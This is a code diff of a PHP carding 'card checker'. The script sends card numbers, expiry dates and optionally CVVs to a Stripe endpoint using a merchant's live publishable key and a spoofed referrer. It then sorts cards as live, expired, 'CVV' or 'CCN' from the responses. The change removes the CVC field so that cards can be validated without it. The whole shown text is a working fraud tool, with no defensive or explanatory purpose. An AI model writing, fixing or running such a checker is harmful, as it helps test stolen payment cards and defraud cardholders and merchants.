@@ -82,7 +82,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=58944b83-940f-434f-aa2d-18bebf226605ea4e98&sid=9b61583e-db16-404a-95e0-38b2e29e8074d026b2&pasted_fields=number&payment_user_agent=stripe.js%2F737366135d%3B+stripe-js-v3%2F737366135d%3B+card-element&referrer=https%3A%2F%2Fmackenthuns.com&time_on_page=102020&key=pk_live_42NAQdWsJvsYYuNdjfeIiPi3SHHkzUVMTFavfvAQT60ZIMUEa6s12SNesga9nDNoikbDJt9h9en9fLFfvAjB0EAIJ009IitWhj9');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=58944b83-940f-434f-aa2d-18bebf226605ea4e98&sid=9b61583e-db16-404a-95e0-38b2e29e8074d026b2&pasted_fields=number&payment_user_agent=stripe.js%2F737366135d%3B+stripe-js-v3%2F737366135d%3B+card-element&referrer=https%3A%2F%2Fmackenthuns.com&time_on_page=102020&key=pk_live_42NAQdWsJvsYYuNdjfeIiPi3SHHkzUVMTFavfvAQT60ZIMUEa6s12SNesga9nDNoikbDJt9h9en9fLFfvAjB0EAIJ009IitWhj9');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -198,7 +198,7 @@ $response = "Expired Card 🚫";
 
 elseif (strpos($result2a, 'Thank you for your message.')){
   $status = "Live 🟢";
-$response = "CVV 3$ ✅";
+$response = "CCN 3$ ✅";
 
   }
 
